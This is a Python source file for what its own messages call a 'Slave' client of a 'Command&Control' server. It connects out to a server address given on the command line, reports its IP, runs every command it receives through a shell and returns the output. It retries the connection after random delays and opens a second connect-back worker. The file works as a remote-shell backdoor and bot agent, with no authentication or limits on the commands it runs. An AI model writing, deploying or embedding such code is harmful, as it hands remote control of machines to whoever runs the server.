import socket
import os
import subprocess
import multiprocessing
import sys
import time
import re
from datetime import datetime
from optparse import OptionParser
from random import randrange

import utilities


def parse_cli_args():
    parser = OptionParser()
    parser.add_option('-a', '--socket_addr', dest='socket_addr')
    parser.add_option('-p', '--socket_port', dest='socket_port')
    options, args = parser.parse_args()
    return {
        'server_addr': options.socket_addr,
        'server_port': options.socket_port
    }


def handle_payload(cmd, *args, **kwargs):
    # cli_args = args + kwargs.items()
    command_payload = [cmd] + list(args)
    response = subprocess.check_output(command_payload, shell=True)
    return response


def cluster_fs_worker(sock_addr, port):
    fs_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # fs_socket.settimeout(0.01)
    fs_port = int(port)
    fs_socket.connect((sock_addr, fs_port))
    while True:
        try:
            fs_socket.sendall(f'Worker connected: {datetime.now()}'.encode('utf-8'))
            time.sleep(1)
            data = fs_socket.recv(1024).decode('utf-8')
            print(data)
        except socket.timeout:
            print('FS timeout')
        except socket.error as e:
            print(e)
            print('Cluster FS: Network socket exception. Closing connection...')
            fs_socket.close()
            return

def main(sock_addr, sock_port):
    """
        Main program entrypoint,
        handles error in try/catch block and 
        reestablishes connection on unhandled exceptions
    """

    opts = parse_cli_args()
    server_addr = sock_addr, int(sock_port)

    ip_addr = utilities.get_ip()

    while 1:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # sock.settimeout(5)
            sock.connect(server_addr)

            connected_msg = f'Slave {ip_addr} initiated at {datetime.now()}'.encode('utf-8')
            sock.sendall(connected_msg)
            print(connected_msg)

            while True:
                try:
                    data = sock.recv(1024).decode('utf-8')
                    # connection HEATHCHECK 
                    if data == 'Ping': 
                        print(f'HEALTHCHECK {datetime.now()} <<< Ping')
                        continue
                    # cluster FS initial connection
                    elif re.match('\d+', data):
                        try:
                            cluster_fs_process = multiprocessing.Process(target=cluster_fs_worker, args=(sock_addr, data))
                            cluster_fs_process.start()
                        except Exception as e:
                            print(e)
                    # worker
                    elif data:
                        print(f'Received at : {datetime.now()} << {data}')
                        # handle payload
                        capture = handle_payload(cmd=data)
                        sock.sendall(capture)
                    # server is off
                    else:
                        break
                except socket.timeout:
                    # capture traceback
                    print('Timeout receiving command data from Command&Control')
                    time.sleep(1)
        except socket.error as e:
            sock.close()
            ttr = randrange(0, 100)
            print(e)
            print(f'Waiting {ttr} to retry connection attempt.')
            time.sleep(ttr)
        # finally:
        #     sock.close()
            # main(sock_addr, sock_port)


if __name__ == '__main__':
    opts = parse_cli_args()
    main(
        opts['server_addr'], 
        opts['server_port']
    )
